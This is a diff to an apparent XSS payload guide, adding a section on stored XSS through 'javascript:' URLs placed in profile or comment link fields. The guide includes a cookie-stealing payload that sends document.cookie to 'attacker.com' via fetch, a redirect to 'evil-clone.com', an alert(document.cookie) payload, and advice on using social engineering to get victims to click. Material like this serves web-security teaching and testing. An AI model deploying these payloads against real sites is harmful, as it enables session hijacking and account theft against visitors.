@@ -61,10 +61,22 @@ javascript:location='https://evil-clone.com'
 
 ## Delivering the payload
 
+### DOM context — URL parameter
 Inject via the vulnerable URL parameter:
 ```
 https://target.com/feedback?returnPath=javascript:fetch('https://attacker.com/?c='+document.cookie)
 ```
+
+### Stored context — form fields
+Some apps take user-supplied URLs (website field in comment forms, profile URLs, social links) and render them as clickable `<a href="...">` links. If double quotes are HTML-encoded, you can't break out — but you don't need to. Just supply a `javascript:` URL directly as the field value:
+
+```
+javascript:alert(document.cookie)
+```
+
+The app stores it, renders it inside the href, and anyone who clicks the author name/link executes your payload. This is **stored XSS** — it persists and affects every visitor, not just a crafted URL victim.
+
+**Why double-quote encoding doesn't help here:** The app encodes `"` to prevent breaking out of the attribute, but `javascript:` doesn't need to break out — it's valid href content. The filter protects against the wrong attack vector.
 
 **Important:** This requires the victim to click the link. Unlike `onerror`, `javascript:href` does not fire automatically — you need social engineering to get the click.
 
